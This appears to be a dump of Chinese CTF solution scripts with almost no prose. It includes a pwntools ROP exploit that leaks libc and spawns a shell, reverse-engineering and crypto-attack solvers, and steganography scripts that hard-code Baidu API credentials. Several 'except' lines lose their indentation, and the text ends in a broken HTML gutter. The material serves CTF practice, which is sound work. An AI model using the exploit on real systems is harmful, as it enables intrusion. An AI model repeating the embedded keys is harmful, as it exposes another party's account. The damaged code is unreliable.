+  [73,17,241,93,126,64,243,182,131,74,8,8,130,241,256,58,121,207,106,112,172,63,244,166,135,81,104,157,117,116,19,138,123,33,164,202,238,216,23,230,29,117,186,237,193,213,70,200,137,204],
+  [175,43,178,24,125,9,90,208,133,2,31,135,207,158,76,114,255,159,14,207,218,208,255,16,244,121,135,11,94,132,175,222,6,101,171,27,134,2,181,175,222,63,243,204,98,30,44,35,69,175],
+  [244,190,74,183,118,189,148,86,238,194,232,33,219,21,103,191,175,150,228,1,205,34,51,189,222,127,61,144,78,160,155,117,74,222,192,189,116,101,243,50,6,212,60,76,90,87,93,135,215,235],
+  [56,110,105,28,52,42,145,7,196,110,229,237,219,243,141,73,30,73,123,108,149,144,236,202,108,10,72,160,16,111,173,22,235,86,86,174,185,44,78,144,200,118,33,158,190,3,255,10,148,83],
+  [249,147,83,224,170,122,14,241,126,36,248,46,246,25,228,143,26,146,210,47,0,28,122,206,213,179,69,163,189,187,149,128,171,168,200,110,187,256,238,125,250,118,15,106,14,38,119,179,1,209],
+  [68,79,154,139,71,117,130,98,136,160,146,74,137,107,115,108,233,242,199,206,19,223,147,44,100,33,77,70,66,173,131,85,68,63,92,87,79,239,96,176,164,203,50,53,256,89,77,88,126,7],
+  [130,11,151,11,201,119,165,163,189,120,22,170,46,138,136,118,153,250,70,164,208,230,150,156,53,28,243,46,166,54,143,192,225,225,253,5,212,138,235,179,95,255,195,68,248,105,192,237,121,14],
+  [236,204,77,120,79,191,176,77,38,221,97,170,41,9,96,195,70,18,96,28,13,51,87,225,2,28,218,230,53,253,171,83,83,224,41,31,247,126,228,254,115,0,87,33,29,85,200,113,158,187],
+  [22,186,66,8,171,180,195,151,204,157,211,141,217,67,80,20,58,21,233,115,62,111,166,210,65,95,252,139,80,223,31,6,226,204,92,197,122,133,51,64,191,250,203,118,144,135,247,97,35,10],
+  [45,144,167,46,138,170,169,113,202,58,93,86,29,118,43,121,228,93,120,71,113,99,185,102,64,5,247,123,224,214,148,132,166,49,238,199,211,197,243,48,55,103,74,73,218,62,200,47,73,135],
+  [27,128,70,245,100,225,76,201,20,130,112,132,45,92,143,12,12,159,238,142,184,181,152,227,113,67,53,232,203,192,177,94,88,211,11,231,41,232,0,48,161,9,107,80,138,190,230,166,250,102],
+]
+
+if __name__ == "__main__":
+    sol, max_val, dp = get_solution(arr)
+    print(sol)
+
+RRDDRRDRRDRRRDRDDDDRRRDRDDRRRDRRDRRRDRDRDRDRRRDDRDRRRRDDDDDDDRDDRDDDDDDDDRDDDDDRDDRDRRDRRRRRRDDRRR
+
+RRDDRRDRRDRRRDRDDDDRRRDRDDRRRDRRDRRRDRDRDRDRRRDDRDRRRRDDDDDDDRDDRDDDDDDDDRDDDDDRDDRDRRDRRRRRRDDRRR
+Good job
+flag{333b61656d554e1e200208247b73}
+
+import idc
+
+st = MinEA()
+ed = MaxEA()
+ea = st
+while ea < ed:
+    if Byte(ea) == 0x75 and Byte(ea+1) == 0x03 and Byte(ea+2) == 0x74 and Byte(ea+3) == 0x01 and Byte(ea+4) == 0xe8:
+        print("发现花指令")    
+        patch_byte(ea, 0x90)
+        patch_byte(ea+1, 0x90)
+        patch_byte(ea+2, 0x90)
+        patch_byte(ea+3, 0x90)
+        patch_byte(ea+4, 0x90)
+    ea += 1
+
+#include <string.h>
+#include <stdio.h>
+
+#define BYTE unsigned char
+#define WORD unsigned short
+#define DWORD unsigned int
+
+#define TRUE 1
+#define FALSE 0
+
+BYTE bThreshold;  //压缩阈值、长度大于等于2的匹配串才有必要压缩
+
+BYTE bPreBufSizeBits;  //前向缓冲区占用的比特位
+BYTE bWindowBufSizeBits;  //滑动窗口占用的比特位
+
+WORD wPreBufSize;  //通过占用的比特位计算缓冲区大小
+WORD wWindowBufSize;  //通过占用的比特位计算滑动窗口大小
+
+BYTE bPreBuf[1024];  //前向缓冲区
+BYTE bWindowBuf[8192];  //滑动窗口
+BYTE bMatchString[1024];  //匹配串
+WORD wMatchIndex;  //滑动窗口匹配串起始下标
+
+BYTE FindSameString(BYTE *pbStrA, WORD wLenA, BYTE *pbStrB, WORD wLenB, WORD *pwMatchIndex);
+DWORD LZSS_decode(char *pbReadFileName, char *pbWriteFileName);
+
+int main()
+{
+    bThreshold = 3;
+    bPreBufSizeBits = 8;
+    bWindowBufSizeBits = 16 - bPreBufSizeBits;
+    wPreBufSize = ((WORD)1 << bPreBufSizeBits) - 1 + bThreshold;
+    wWindowBufSize = ((WORD)1 << bWindowBufSizeBits) - 1 + bThreshold;
+
+    LZSS_decode("out", "decode.txt");
+    return 0;
+}
+
+BYTE FindSameString(BYTE *pbStrA, WORD wLenA, BYTE *pbStrB, WORD wLenB, WORD *pwMatchIndex)
+{
+    WORD i, j;
+
+    for (i = 0; i < wLenA; i++)
+    {
+        if ((wLenA - i) < wLenB)
+        {
+            return FALSE;
+        }
+
+        if (pbStrA[i] == pbStrB[0])
+        {
+            for (j = 1; j < wLenB; j++)
+            {
+                if (pbStrA[i + j] != pbStrB[j])
+                {
+                    break;
+                }
+            }
+
+            if (j == wLenB)
+            {
+                *pwMatchIndex = i;
+                return TRUE;
+            }
+        }
+    }
+    return FALSE;
+}
+
+DWORD LZSS_decode(char *pbReadFileName, char *pbWriteFileName)
+{
+    WORD i, j;
+    BYTE bItemNum;
+    BYTE bFlag;
+    WORD wStart;
+    WORD wMatchStringCnt = 0;
+    WORD wWindowBufCnt = 0;
+    FILE *pfRead = fopen(pbReadFileName, "rb");
+    FILE *pfWrite = fopen(pbWriteFileName, "wb");
+
+    while (0 != fread(&bFlag, 1, 1, pfRead))
+    {
+        for (bItemNum = 0; bItemNum < 8; bItemNum++)
+        {
+            if (0 == (bFlag & ((BYTE)1 << (7 - bItemNum))))
+            {
+                if (fread(bPreBuf, 1, 1, pfRead) < 1)
+                {
+                    goto LZSS_decode_out_;
+                }
+                fwrite(bPreBuf, 1, 1, pfWrite);
+                bMatchString[0] = bPreBuf[0];
+                wMatchStringCnt = 1;
+            }
+            else
+            {
+                if (fread(bPreBuf, 1, 2, pfRead) < 2)
+                {
+                    goto LZSS_decode_out_;
+                }
+                wStart = ((WORD)bPreBuf[0] | ((WORD)bPreBuf[1] << 8)) / ((WORD)1 << bPreBufSizeBits);  
+                wMatchStringCnt = ((WORD)bPreBuf[0] | ((WORD)bPreBuf[1] << 8)) % ((WORD)1 << bPreBufSizeBits) + bThreshold;
+                fwrite(&bWindowBuf[wStart], 1, wMatchStringCnt, pfWrite);
+                memcpy(bMatchString, &bWindowBuf[wStart], wMatchStringCnt);
+            }
+            if ((wWindowBufCnt + wMatchStringCnt) > wWindowBufSize)
+            {
+                j = (wWindowBufCnt + wMatchStringCnt) - wWindowBufSize;
+                for (i = 0; i < wWindowBufCnt - j; i++)
+                {
+                    bWindowBuf[i] = bWindowBuf[i + j];
+                }
+                wWindowBufCnt -= j;
+            }
+            memcpy(&bWindowBuf[wWindowBufCnt], bMatchString, wMatchStringCnt);
+            wWindowBufCnt += wMatchStringCnt;
+        }
+    }
+
+LZSS_decode_out_:
+
+    fclose(pfRead);
+    fclose(pfWrite);
+    return 0;
+}
+
+from pwn import*
+context.log_level=True
+#p=process('./stack')
+p=remote("127.0.0.1",8665)
+elf=ELF('stack')
+libc=ELF('libc.so.6')
+buf=0x6010A0+0X100
+print hex(buf)
+#puts_plt=elf.plt['puts']
+puts_plt=0x400520
+puts_got=elf.got['puts']
+#read_plt=elf.plt['read']
+read_plt=0x400530
+main=0x40071A
+
+leve_ret=0x00400718
+popret=0x00000000004007a3
+
+payload='A'*0x100+p64(buf)+p64(popret)+p64(puts_got)+p64(puts_plt)+p64(main)
+
+p.recvuntil('your name:n')
+p.send(payload)
+
+p.recvuntil('your data:n')
+payload1='a'*0x70+p64(buf)+p64(leve_ret)
+
+#gdb.attach(p,'b *0x40060F')
+#raw_input()
+
+p.send(payload1)
+
+#p.recv()
+
+putsadd=u64(p.recvuntil('n',drop=True).ljust(0x8,'x00'))
+print hex(putsadd)
+
+libc_base = putsadd- libc.sym['puts']
+one_gadget = libc_base +0xf03a4
+p.recv()
+p.send("1")
+p.recv()
+pay= 0x78*'a' + p64(one_gadget)*4
+p.send(pay)
+p.interactive()
+
+size_r=src.size;
+ptr_r=src.ptr;
+check(src,dst);
+free(dst.ptr);
+src.size=0;src.ptr=0;
+dst.size=size_r;dst.ptr=src_r;
+//src=dst时，会导致dst的ptr指向已释放的区域，且dst.size=0
+
+struct Table {
+    struct GCObject *next;
+    lu_byte tt;
+    lu_byte marked;
+    lu_byte flags;
+    lu_byte lsizenode;
+    unsigned int alimit;
+    TValue *array;
+    Node *node; /*     24      |       8 */
+    Node *lastfree;
+    struct Table *metatable;
+    GCObject *gclist;
+}
+
+from PIL import Image
+import os
+from aip import AipSpeech
+from subprocess import *
+from tqdm import tqdm  
+import pickle 
+import io 
+
+def load_mp3(folder):
+    '''
+    加载文件夹下的mp3
+    '''
+    mp3list = []
+    # img=[]
+    for mp3 in os.listdir(folder):
+        ext = os.path.splitext(mp3)
+        # if len(ext) > 1 and is_img(ext[1]):
+        if ext[1] == '.mp3' :
+            filename=folder+mp3
+            mp3list.append(filename)
+            # img.append(mp3)
+
+    return mp3list
+
+def getimage(mp3file):
+    with open(mp3file,'rb') as f:
+        fr=f.read()
+    offset=int.from_bytes(fr[14:18],'big')
+    fr1=fr[20:20+offset]
+    fr1=fr1[13:]
+    img=io.BytesIO(fr1)
+    img=Image.open(img)
+    return img
+    pass
+
+def main():
+
+    num_dict={"0":u"零","1":u"一","2":u"二","3":u"三","4":u"四","5":u"五","6":u"六","7":u"七","8":u"八","9":u"九"}
+    new_dict={v:k for k,v in num_dict.items()}
+    print(num_dict)
+    print(new_dict)  #互换键值
+    set1=set('0123456789'+''.join([i for i in new_dict]))
+    set2=set('0123456789')
+
+    mp3list=load_mp3('./random/')
+
+    dict1={}
+    for i,mp3 in tqdm(enumerate(mp3list)):    #把mp3转换成wav，百度aip对wav支持较好
+        wavname='./wav/'+os.path.split(mp3)[1].split('.')[0]+'.wav'
+        indexname=os.path.split(mp3)[1].split('.')[0]
+        cmd="ffmpeg.exe -i {} -f wav -ac 1 -ar 16000 {}".format(mp3,wavname)   #调用ffmpeg.exe
+
+        p=Popen(cmd,shell=True,stdout=open("process.out", "w"), close_fds=True)
+        p.wait()
+
+        with open(wavname, 'rb') as f:
+            fp= f.read()
+            # 识别本地文件
+        try:
+            result = client.asr(fp, 'wav', 16000, {'dev_pid': 1537})
+# 默认1537（普通话 输入法模型），dev_pid参数见本节开头的表格
+            tmp=result['result'][0][:-1]
+            if set(tmp).issubset(set2):
+                dict1[indexname]=int(tmp)
+            elif    set(tmp).issubset(set1):
+                tmp1=''
+                for j in tmp:
+                    if j in set2:
+                        tmp1+=j
+                    else:
+                        tmp1+=new_dict[j]
+                dict1[indexname]=int(tmp1)
+            else:
+                dict1[indexname]=tmp
+        
+except Exception as e:
+            print(e)
+            print("./wav/{}.wav".format(i))
+    pass
+    dict2={v:k for k,v in dict1.items()}   #互换键值
+    print(dict2)
+    for i in range(0,625):
+        try:
+            dict2[i]
+        
+except Exception as e:
+            print(e)
+            print(i,'不存在')
+    pick_file = open('dict2.pickle','wb')
+    pickle.dump(dict2,pick_file)
+    pick_file.close()
+
+    pick_file = open('dict1.pickle','wb')
+    pickle.dump(dict1,pick_file)
+    pick_file.close()
+
+APP_ID = '26805318' 
+API_KEY = 'zXkQ4cEEVHPHLSoEjqLgevqQ' 
+SECRET_KEY = '7GptONVCNLblYqwevUq6YzgFLPOO1i4B' 
+
+client = AipSpeech(APP_ID, API_KEY, SECRET_KEY)
+
+wavpath='./wav/'     #调试数据所在目录
+if not os.path.exists(wavpath):
+    os.mkdir(wavpath)
+
+if  not os.path.exists('dict2.pickle'):
+    main()      #如果没有转换成wav,需要先转换一次,然后得到pickle
+else:            #直接读取pickle
+    pickfile = open('dict2.pickle','rb')
+    dictfile2 = pickle.load(pickfile)
+    print(dictfile2)
+    pickfile = open('dict1.pickle','rb')
+    dictfile1 = pickle.load(pickfile)
+    print(dictfile1)
+    pass
+
+img1=Image.new('RGB',(2500,2500),'white')  #新建底图
+for i in range(0,625):
+    try:
+        mp3num=dictfile2[i]
+        mp3file='./random/'+mp3num+'.mp3'
+        img=getimage(mp3file)    #提取mp3中的图片
+        x=(i%25)*100
+        y=(i//25)*100
+        img1.paste(img,(x,y))
+    
+except Exception as e:
+        print(e)
+        print(i,'没有找到')
+img1.save('tmp.png')
+img1.show()
+pass
+
+import pickle
+import os 
+
+def load_mp3(folder):
+    '''
+    加载文件夹下的mp3
+    '''
+    mp3list = []
+    # img=[]
+    for mp3 in os.listdir(folder):
+        ext = os.path.splitext(mp3)
+        # if len(ext) > 1 and is_img(ext[1]):
+        if ext[1] == '.mp3' :
+            filename=folder+mp3
+            mp3list.append(filename)
+            # img.append(mp3)
+
+    return mp3list
+
+def getFrameoffset(fr):
+    tmp=''
+    for i in fr:
+        tmp+=bin(i)[2:].zfill(7)
+    pass
+    return int(tmp,2)
+
+def getpadding(mp3):
+    with open(mp3,'rb')as f:
+        fr=f.read()
+    offset=getFrameoffset(fr[6:10])+10
+    padding=fr[offset-4096:
+offset]
+    if set(padding)=={0}:    #全为0说明padding里头没有数据
+        print('no mp3 inside')
+        return None,fr
+    else:                    #说明padding里头有东西,我们从非0开始取数据,发现是mp3
+        for i,data in enumerate(padding):
+            if data!=0:
+                newmp3=padding[i:]
+                return newmp3,fr
+    pass
+
+pickfile = open('dict2.pickle','rb')
+dictfile2 = pickle.load(pickfile)
+print(type(dictfile2),dictfile2)
+print(100*'*')
+pickfile = open('dict1.pickle','rb')
+dictfile1 = pickle.load(pickfile)
+print(type(dictfile1),dictfile1)
+
+if not os.path.exists('./存在padding的文件/'):
+    os.mkdir('./存在padding的文件/')
+
+mp3list=load_mp3('./random/')
+for i,mp3 in enumerate(mp3list):
+    n=os.path.split(mp3)[1].split('.')[0]
+    newmp3,mp3file=getpadding(mp3)
+    if newmp3:   #padding中存在mp3
+        open('./存在padding的文件/{}-{}-padding.mp3'.format(dictfile1[n],n),'wb').write(newmp3)
+        open('./存在padding的文件/{}-{}.mp3'.format(dictfile1[n],n),'wb').write(mp3file)
+    else:
+        continue
+    pass
+
+import os
+from aip import AipSpeech
+from subprocess import *
+
+def load_mp3(folder):
+    '''
+    加载文件夹下的mp3
+    '''
+    mp3list = []
+    dict1={}
+    for mp3 in os.listdir(folder):
+        ext = os.path.splitext(mp3)
+
+        if ext[1] == '.mp3' and 'padding' in mp3:
+            id=int(ext[0].split('-')[0])
+            filename=folder+mp3
+            mp3list.append(filename)
+            dict1[id]=filename
+
+    return mp3list,dict1
+
+APP_ID = '26805318' 
+API_KEY = 'zXkQ4cEEVHPHLSoEjqLgevqQ' 
+SECRET_KEY = '7GptONVCNLblYqwevUq6YzgFLPOO1i4B' 
+
+client = AipSpeech(APP_ID, API_KEY, SECRET_KEY)
+
+mp3dict=load_mp3('./存在padding的文件/')[1]
+
+wavpath='./flagwav/'     #调试数据所在目录
+if not os.path.exists(wavpath):
+    os.mkdir(wavpath)
+
+res=[]
+for i in range(48):
+    wavname='./flagwav/'+str(i)+'.wav'
+
+    cmd="ffmpeg.exe -i {} -f wav -ac 1 -ar 16000 {}".format(mp3dict[i],wavname)   #调用ffmpeg.exe
+
+    p=Popen(cmd,shell=True,stdout=open("process.out", "w"), close_fds=True)
+    p.wait()
+
+    with open(wavname, 'rb') as f:
+        fp= f.read()
+        # 识别本地文件
+    try:
+        result = client.asr(fp, 'wav', 16000, {'dev_pid': 1737})
+# 默认1537（普通话 输入法模型），1737是英语
+        tmp=result['result'][0][:-1]
+        res.append((i,tmp))
+        # print(tmp,end='')
+    
+except Exception as e:
+        print(e)
+open("结果识别.txt",'w').write(''.join([str(i)+'n' for i in res]))
+
+zmvhngzjytatodbimi00ntfilwjjmzutzdfknja0zdq0mmvi
+
+import string
+from base64 import * 
+
+ss=set('abcdef'+string.digits+'flag{}-')
+text1='zmvhngzjytatodbimi00ntfilwjjmzutzdfknja0zdq0mmvi'   #因为数量不多,我们尝试用耳朵听出来
+
+def alls(text):
+    res=[""]
+    for i in (text):
+        if not i.isalpha():
+            for j in range(len(res)):
+                res[j] += i
+        else:
+            for k in range(len(res)):
+                tmp = res[k]
+                res[k] += i.lower()
+                res.append(tmp + i.upper())
+    return res
+
+for i in range(0,len(text1),4):
+    t=(text1[i:i+4])
+    res=alls(t)
+    for j in res:
+        try:
+            tmp=b64decode(j.encode()).decode()
+            if set(tmp).issubset(ss):  #字符串是0-9a-fflag{}-的子集的话,即uuid格式
+                print(tmp,end='')
+
+        
+except Exception as e:
+            continue
+# print(tmp)
+
+已知a,b,N,num1
+num1 = (seed *a + b ) % N
+由于b比N小则
+num1 - b = seed * a % N
+由于取模，则需要模数逆推
+seed = (num1-b)*inverse(a,N)%N
+
+def solve1(N,a,b,n1):
+    return (n1-b)*inverse(a,N) % N
+
+已知a,N,num1,num2
+需要先通过num1,num2求出b
+由于num2 = (num1 *a + b ) % N
+b = (n2-n1 * a)%N
+然后再带入def solve1()就行
+
+def solve2(N,a,n1,n2):
+    b = (n2-n1 * a)%N
+    return solve1(N,a,b,n1)
+
+这次只知道num1,num2,num3,N
+需要求出a然后带入solve2中求出b
+num3 = (num2*a + b) %N
+num2 = (num1*a + b) %N
+->
+num3-b = num2*a % N
+num2-b = num1*a % N
+->
+num3 - num2 = num2*a % N - num1*a %N
+->
+num3 - num2 = a*(num2-num1) % N
+->
+a = (num3-num2)*inverse(num2-num1,N) %N
+
+def solve3(N,n1,n2,n3):
+    a = (n3-n2)*inverse(n2-n1,N) %N
+    return solve2(N,a,n1,n2)
+
+只知道6个连续的随机数,这次就不能用线性方程组了,因为对与每一个方程,它的模数都是未知的.
+5个方程就会多出5个未知数
+但是如果多个随机数分别乘n,那么gcd就可能等于n
+我们可以设置几个模0式,然后进行gcd运算,可以在模数未知的情况下通过多个未知数序列算出模数
+
+跟solve3有类似的地方
+s1 = num2-num1 ->(num2*a+b) -(num1*a+b) = a*(num2-num1) = a*s1 %N
+s2 = num3-num2 ->(num3*a+b) -(num2*a+b) = a*(num3-num2) = a*s2 %N
+s3 = num4-num3
+s4 = num5-num4
+s5 = num6-num5
+那么t1-6就有共同的模数
+再做出模0式,可以互乘再做差
+t3*t1-t2**2
+t5*t2-t4*t3
+然后进行gcd求n
+N = GCD(t3*t1-t2**2,t5*t2-t4*t3)
+但是此时的N不一定是素数,只是接近true_N,那么就可以用光滑阶进行求解
+F = factorint(N)
+F.items() -> p,q
+N = N / pow(p,q)
+
+def solve4(num1,num2,num3,num4,num5,num6):
+    s1 = num2-num1
+    s2 = num3-num2
+    s3 = num4-num3
+    s4 = num5-num4
+    s5 = num6-num5
+    N = GCD(s3*s1-s2**2,s5*s2-s4*s3)
+    F = factorint(N)
+    while 1:
+        if isPrime(int(N)):
+            return solve3(N,num1,num2,num3)
+        else:
+            for p,q in F.items():
+                if p.bit_length()>128:
+                    continue
+                N = N/pow(p,q)
+
+from pwn import *
+from sympy import factorint
+from Crypto.Util.number import *
+context.log_level = 'debug'
+#io = remote("0.0.0.0",10000)
+
+def solve1(N,a,b,num1):
+    return (num1-b)*inverse(a,N) % N
+def solve2(N,a,num1,num2):
+    b = (num2-num1 * a)%N
+    return solve1(N,a,b,num1)
+def solve3(N,num1,num2,num3):
+    a = (num3-num2)*inverse(num2-num1,N) %N
+    return solve2(N,a,num1,num2)
+def solve4(num1,num2,num3,num4,num5,num6):
+    s1 = num2-num1
+    s2 = num3-num2
+    s3 = num4-num3
+    s4 = num5-num4
+    s5 = num6-num5
+    N = GCD(s3*s1-s2**2,s5*s2-s4*s3)
+    F = factorint(N)
+    while 1:
+        if isPrime(int(N)):
+            return solve3(N,num1,num2,num3)
+        else:
+            for p,q in F.items():
+                if p.bit_length()>128:
+                    continue
+                N = N/pow(p,q)
+
+def challenge1():
+    io.recvuntil("a=")
+    a = int(io.recvline().strip())
+    io.recvuntil("b=")
+    b = int(io.recvline().strip())
+    io.recvuntil("N=")
+    N = int(io.recvline().strip())
+    io.recvuntil("num1=")
+    num1 = int(io.recvline().strip())
+    seed = solve1(N,a,b,num1)
+    io.recvuntil("seed = ")
+    io.sendline(str(seed))
+
+def challenge2():
+    io.recvuntil("a=")
+    a = int(io.recvline().strip())
+    io.recvuntil("N=")
+    N = int(io.recvline().strip())
+    io.recvuntil("num1=")
+    num1 = int(io.recvline().strip())
+    io.recvuntil("num2=")
+    num2 = int(io.recvline().strip())
+    seed = solve2(N,a,num1,num2)
+    io.recvuntil("seed = ")
+    io.sendline(str(seed))
+
+def challenge3():
+    io.recvuntil("N=")
+    N = int(io.recvline().strip())
+    io.recvuntil("num1=")
+    num1 = int(io.recvline().strip())
+    io.recvuntil("num2=")
+    num2 = int(io.recvline().strip())
+    io.recvuntil("num3=")
+    num3 = int(io.recvline().strip())
+    seed = solve3(N,num1,num2,num3)
+    io.recvuntil("seed = ")
+    io.sendline(str(seed))
+
+def challenge4():
+    io.recvuntil("num1=")
+    num1 = int(io.recvline().strip())
+    io.recvuntil("num2=")
+    num2 = int(io.recvline().strip())
+    io.recvuntil("num3=")
+    num3 = int(io.recvline().strip())
+    io.recvuntil("num4=")
+    num4 = int(io.recvline().strip())
+    io.recvuntil("num5=")
+    num5 = int(io.recvline().strip())
+    io.recvuntil("num6=")
+    num6 = int(io.recvline().strip())
+    seed = solve4(num1,num2,num3,num4,num5,num6)
+    io.recvuntil("seed = ")
+    io.sendline(str(seed))
+for i in range(50):
+    challenge1()
+    print(i)
+for i in range(30):
+    challenge2()
+    print(i)
+for i in range(20):
+    challenge3()
+    print(i)
+challenge4()
+
+io.interactive()
+
+from Crypto.Util.number import *
+
+p = 101202160159081561029549739902097099275439197324107563340103725793005952286427
+a = 77352628233208904456190113484930965015529164818065903310716894212030514274681
+g = 60481606253840272416608492349866939317114665311741132450767745324720776050313
+
+with open('output.txt', 'r') as f:
+    data = f.readlines()
+    G = eval(data[0])
+    Q = eval(data[1])
+    leak = eval(data[2])
+
+Qpp = Qp(p, prec=666)
+s2 = (Qpp(leak).log() / Qpp(g).log()).lift()
+print(long_to_bytes(s2))
+
+b = (G[1]^2 - G[0]^3 - a*G[0]) % p^5
+
+Fp5 = Zmod(p^5)
+E = EllipticCurve(Fp5, [a, b])
+
+p_ord = E.change_ring(GF(p)).order()
+
+EQp = E.change_ring(Qp(p))
+QpG = EQp(G) * p_ord
+QpQ = EQp(Q) * p_ord
+
+phiG = -QpG[0] / QpG[1]
+phiQ = -QpQ[0] / QpQ[1]
+
+s1 = ZZ(phiQ / phiG)
+print(long_to_bytes(s1))
+
++ + + + + + + + + + +
+
+✦  +
+
++
+
+有话说
+
+如果您有比赛想要宣传，欢迎联系我们刊登发布
+
+如果您想练习历史大赛CTF题目，欢迎体验演武场
+
+扫描关注下方春秋GAME官方公众号
+
+发送“了解”两字即可了解更多以及加入春秋赛事宇宙官方微信群
+
+春秋GAME期待与您的见面~~~
+
++ + + + + + + + + + +
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span 